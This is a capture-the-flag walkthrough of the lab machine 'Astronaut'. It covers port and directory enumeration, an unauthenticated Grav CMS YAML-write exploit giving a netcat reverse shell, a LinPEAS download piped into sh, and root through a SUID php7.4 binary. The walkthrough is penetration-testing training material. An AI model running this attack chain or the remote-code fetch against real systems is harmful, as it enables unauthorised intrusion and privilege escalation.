---

tags:

- ctf
    
- offsec
    
- proving-grounds
    
- linux
    
- web
    
- grav
    
- grav-cms
    
- grav-admin
    
- yaml
    
- arbitrary-file-write
    
- unauthenticated
    
- rce
    
- reverse-shell
    
- netcat
    
- linpeas
    
- suid
    
- php
    
- php7-4
    
- gtfobins
    
- privilege-escalation
    
- root
    

---

# Astronaut

## Overview

**Platform:** OffSec Proving Grounds  
**Operating System:** Linux  
**Web Application:** Grav / Grav Admin  
**Initial Access:** Unauthenticated Grav arbitrary YAML write/update leading to RCE  
**Initial Access Type:** Web application exploitation  
**Privilege Escalation:** SUID `php7.4` binary  
**Final Access:** Root

### Key Techniques

- Fast TCP port enumeration
    
- Targeted Nmap service enumeration
    
- Web application fingerprinting
    
- Directory enumeration with Dirsearch
    
- Exploit research with SearchSploit
    
- Grav CMS exploitation
    
- Base64-encoded reverse shell payload
    
- Netcat reverse shell
    
- LinPEAS enumeration
    
- SUID binary enumeration
    
- GTFOBins
    
- SUID PHP privilege escalation
    

---

# Attack Path

```text
Port Enumeration
        ↓
Discover HTTP on Port 80
        ↓
Identify Grav Admin
        ↓
Enumerate Application
        ↓
Search Grav Vulnerabilities
        ↓
Unauthenticated Arbitrary YAML Write
        ↓
Remote Code Execution
        ↓
Reverse Shell
        ↓
LinPEAS Enumeration
        ↓
Discover SUID php7.4
        ↓
GTFOBins SUID Abuse
        ↓
Root Shell
```

---

# 1. Initial Port Enumeration

Begin with a quick scan of the most common TCP ports.

```bash
nmap -v -sS --top-ports 1000 -T4 -n <Target-IP> -oN common_ports.txt
```

### Options

|Option|Purpose|
|---|---|
|`-v`|Verbose output|
|`-sS`|TCP SYN scan|
|`--top-ports 1000`|Scan the 1,000 most common ports|
|`-T4`|Faster timing profile|
|`-n`|Disable DNS resolution|
|`-oN`|Save normal-format output|

The scan identified:

```text
22/tcp
80/tcp
```

---

# 2. Targeted Service Enumeration

Once the open ports are known, perform detailed enumeration only against those ports.

```bash
nmap -p 22,80 -A -v <Target-IP>
```

This provides:

- Service detection
    
- Version detection
    
- Default scripts
    
- OS information
    
- Additional HTTP information
    

## Interesting Service

Port `80` exposed:

```text
Application: grav-admin
Server: Apache 2.4.41
Platform: Linux
```

The web application became the primary attack surface.

> [!tip] Methodology  
> A fast port scan followed by targeted service enumeration is often more efficient than immediately running an aggressive scan against every port.

---

# 3. Web Application Enumeration

Browse the application manually first.

The discovered application was:

```text
Grav Admin / Grav CMS
```

An exact application name is valuable because it provides a much narrower vulnerability research target.

---

# 4. Directory Enumeration

Use Dirsearch against the Grav application.

```bash
dirsearch -u http://Target-IP/grav-admin/ --exclude-status 404,403,301
```

The objective is to identify:

- Administrative paths
    
- Configuration files
    
- Version information
    
- Plugins
    
- Backup files
    
- Upload directories
    
- Additional Grav functionality
    

> [!tip] Recognition Pattern  
> Once a specific CMS has been identified, directory enumeration should focus on application-specific paths rather than blindly brute-forcing the entire web server.

---

# 5. Vulnerability Research

Search Exploit-DB for Grav vulnerabilities.

```bash
searchsploit grav
```

A relevant exploit was identified for:

```text
Arbitrary YAML Write/Update (Unauthenticated)
```

The walkthrough chose to test the exploit even though there was uncertainty regarding the exact target version.

> [!tip] Version Matching  
> Exploit version ranges are important, but a public exploit that targets a nearby version can still be worth examining.
> 
> Read the exploit first and determine what underlying vulnerability or application behaviour it depends upon.

---

# 6. Inspect the Exploit

Before execution, inspect the exploit source.

Determine:

```text
What URL does it expect?
What endpoint is attacked?
What parameter is vulnerable?
What files does it modify?
How is command execution achieved?
What payload format does it expect?
Does it require authentication?
```

The exploit used in this walkthrough expected the target URL **without a trailing slash**.

Example:

```text
http://<TARGET>/grav-admin
```

rather than:

```text
http://<TARGET>/grav-admin/
```

> [!warning] Exploit Syntax Matters  
> Public exploits can fail because of seemingly minor formatting differences such as trailing slashes, URI paths, ports, or payload encoding.

---

# 7. Prepare the Reverse Shell Payload

The exploit instructions required the reverse-shell command to be supplied through a:

```text
base64_decode
```

payload.

The attacker IP inside the exploit therefore needed to be replaced with the current VPN/tunnel address.

Example listener information from the walkthrough:

```text
Attacker IP: 192.168.1.3
Port:        4444
```

Replace this with your own current attacker IP.

---

# 8. Start the Listener

Start Netcat before triggering the exploit.

```bash
nc -nvlp 4444
```

Then execute the Grav exploit.

If successful, the vulnerable YAML functionality results in command execution and connects back to the listener.

---

# 9. Initial Foothold

The attack chain at this point is:

```text
Grav CMS
   ↓
Unauthenticated YAML Write/Update
   ↓
Malicious Configuration / Payload
   ↓
Command Execution
   ↓
Reverse Shell
```

Once the reverse shell arrives, confirm your context.

```bash
id
whoami
hostname
```

---

# 10. Privilege Escalation Enumeration

The walkthrough used LinPEAS for automated Linux enumeration.

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

LinPEAS should not replace manual enumeration, but it is useful for quickly identifying:

- SUID binaries
    
- sudo permissions
    
- Cron jobs
    
- Writable files
    
- Capabilities
    
- Interesting services
    
- Credentials
    
- Configuration weaknesses
    

---

# 11. Cron Job Enumeration

LinPEAS identified a scheduled service associated with Grav.

However, the scheduler operated with:

```text
user-level privileges
```

and therefore did not immediately provide a route to root.

> [!tip] Do Not Force a Dead End  
> Discovering a cron job does not automatically mean it is exploitable.
> 
> Check:
> 
> - Which user executes it?
>     
> - Is its script writable?
>     
> - Are called binaries writable?
>     
> - Can its input be controlled?
>     
> - Does it execute as root?
>     

In this case, the cron job was not the intended privilege escalation vector.

---

# 12. SUID Enumeration

The important LinPEAS finding was an unusual SUID binary:

```text
php7.4
```

A PHP interpreter normally does not need to be SUID.

This immediately warranted investigation.

> [!tip] Recognition Pattern  
> When reviewing SUID binaries, prioritise interpreters and general-purpose execution tools such as:
> 
> ```text
> bash
> python
> perl
> php
> ruby
> vim
> find
> awk
> env
> ```
> 
> These may provide a direct way to execute commands while retaining the file owner's privileges.

---

# 13. Understanding SUID

A binary with the SUID bit executes with the effective privileges of its owner.

If:

```text
Owner = root
SUID  = set
```

then execution may occur with an effective UID of:

```text
0
```

Conceptually:

```text
Low-Privilege User
        ↓
Executes SUID Binary
        ↓
Effective UID = Binary Owner
        ↓
Root-Owned Binary
        ↓
Potential Root-Level Execution
```

The important question is therefore:

```text
Can this SUID program execute arbitrary commands while preserving its elevated privileges?
```

For `php7.4`, the answer was yes.

---

# 14. Check GTFOBins

Search GTFOBins for:

```text
PHP
```

and specifically review the:

```text
SUID
```

technique.

The walkthrough used the PHP SUID method provided by GTFOBins to obtain an elevated shell.

> [!note] Source Limitation  
> The exact GTFOBins command was contained in a screenshot and was not included in the supplied walkthrough text.
> 
> When reproducing this technique, use the **PHP → SUID** entry on GTFOBins and substitute the actual path to the discovered binary:
> 
> ```text
> /usr/bin/php7.4
> ```

---

# 15. Root Access

After executing the appropriate SUID PHP technique, verify privileges.

```bash
id
```

Expected result:

```text
uid=0(root)
```

Also check:

```bash
whoami
```

Expected:

```text
root
```

---

# 16. Capture Proof

The proof file was located at:

```bash
cat /root/proof.txt
```

At this point, the machine is fully compromised.

---

# Reusable Web Enumeration Methodology

When a web service is identified:

```text
1. Browse manually
2. Identify application / CMS
3. Identify version
4. Enumerate application directories
5. Search known vulnerabilities
6. Read relevant exploits
7. Understand prerequisites
8. Test the vulnerability
9. Obtain command execution
10. Convert RCE into a stable shell
```

---

# Grav CMS Recognition

If you encounter:

```text
Grav
Grav CMS
Grav Admin
grav-admin
```

consider immediately checking for:

```text
Known Grav CVEs
Unauthenticated RCE
YAML configuration vulnerabilities
Arbitrary file write
Plugin vulnerabilities
Admin panel vulnerabilities
Default or weak credentials
Writable configuration files
```

SearchSploit:

```bash
searchsploit grav
```

---

# YAML Exploitation Concept

YAML itself is simply a structured data format.

The vulnerability occurs when an application allows attacker-controlled YAML data to influence sensitive configuration or execution behaviour.

Conceptually:

```text
Attacker-Controlled Input
        ↓
YAML Configuration
        ↓
Application Writes / Updates Config
        ↓
Malicious Value Interpreted
        ↓
Command Execution
```

> [!tip] Key Principle  
> Configuration-file modification can be just as powerful as direct command injection if the application later interprets attacker-controlled configuration as executable behaviour.

---

# Reusable SUID Enumeration

Search manually for SUID binaries with:

```bash
find / -perm -4000 2>/dev/null
```

A more explicit alternative is:

```bash
find / -type f -perm -4000 2>/dev/null
```

Look closely for unusual entries.

Common system SUID binaries may be expected, but unusual interpreters or utilities should be investigated immediately.

---

# SUID Analysis Workflow

When an unusual SUID binary is discovered:

```text
Identify the binary
        ↓
Check owner
        ↓
Confirm SUID permissions
        ↓
Determine its functionality
        ↓
Check GTFOBins
        ↓
Can it:
  - execute commands?
  - read files?
  - write files?
  - load libraries?
  - spawn a shell?
        ↓
Determine whether elevated privileges are preserved
```

Useful checks:

```bash
ls -la /path/to/binary
file /path/to/binary
/path/to/binary --version
```

For Astronaut:

```text
php7.4
   +
SUID root
   +
PHP can execute OS processes
   =
Root privilege escalation
```

---

# Interpreters as SUID Binaries

Interpreters are especially dangerous when SUID because they are designed to execute arbitrary logic.

Examples include:

```text
PHP
Python
Perl
Ruby
Bash
```

A normal binary may provide one specific function.

An interpreter provides an entire execution environment.

A useful way to think about it is:

```text
SUID utility
     =
one privileged capability

SUID interpreter
     =
potentially arbitrary privileged capabilities
```

---

# Quick Reference

## Initial Port Scan

```bash
nmap -v -sS --top-ports 1000 -T4 -n <TARGET> -oN common_ports.txt
```

---

## Targeted Enumeration

```bash
nmap -p 22,80 -A -v <TARGET>
```

---

## Grav Directory Enumeration

```bash
dirsearch -u http://<TARGET>/grav-admin/ --exclude-status 404,403,301
```

---

## Search Grav Exploits

```bash
searchsploit grav
```

---

## Netcat Listener

```bash
nc -nvlp 4444
```

---

## Run LinPEAS

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

## Manual SUID Enumeration

```bash
find / -perm -4000 2>/dev/null
```

---

## Inspect SUID PHP

```bash
ls -la /usr/bin/php7.4
```

---

## Verify Root

```bash
id
whoami
```

---

## Proof

```bash
cat /root/proof.txt
```

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|HTTP application identified|Determine product and exact version|
|`grav-admin` discovered|Grav-specific vulnerabilities|
|Grav CMS|SearchSploit / known CVEs|
|Unauthenticated YAML write|Configuration abuse / RCE|
|Exploit requires Base64 payload|Correctly encode reverse-shell command|
|Web RCE obtained|Establish reverse shell|
|Low-privileged shell|Begin local privilege escalation|
|Cron job discovered|Check execution user and writable components|
|Cron runs as same user|Likely lower priority|
|Unusual SUID binary|GTFOBins|
|SUID `php7.4`|PHP SUID privilege escalation|
|Interpreter owned by root + SUID|Potential arbitrary root execution|

---

# Key Lessons

> [!tip] Enumerate First, Exploit Second  
> Identifying the exact application dramatically reduces the amount of exploit research required.

> [!tip] Read Public Exploits  
> Do not simply execute SearchSploit results. Understand the expected URL format, payload placement, encoding requirements, and vulnerable behaviour.

> [!tip] Configuration Writes Can Become RCE  
> An arbitrary configuration or YAML write may initially sound less serious than command injection, but if the modified configuration is later interpreted by the application, it can provide code execution.

> [!tip] LinPEAS Findings Need Analysis  
> Automated enumeration highlights possibilities, not guaranteed exploits. A user-level cron job may be far less valuable than an unusual root-owned SUID interpreter.

> [!tip] Unusual SUID Binaries Are High Priority  
> Standard SUID binaries are common. A SUID-enabled PHP interpreter is not.
> 
> Always investigate unusual entries first.

> [!tip] Interpreters Are Especially Dangerous  
> A SUID interpreter can turn a restricted privilege into general-purpose code execution because the interpreter itself is capable of executing arbitrary logic.

---

# Attack Chain Summary

```text
HTTP :80
    ↓
Grav Admin
    ↓
Grav Vulnerability Research
    ↓
Unauthenticated Arbitrary YAML Write/Update
    ↓
Remote Code Execution
    ↓
Reverse Shell
    ↓
Linux Enumeration
    ↓
LinPEAS
    ↓
SUID /usr/bin/php7.4
    ↓
GTFOBins PHP SUID Technique
    ↓
Effective UID 0
    ↓
ROOT
```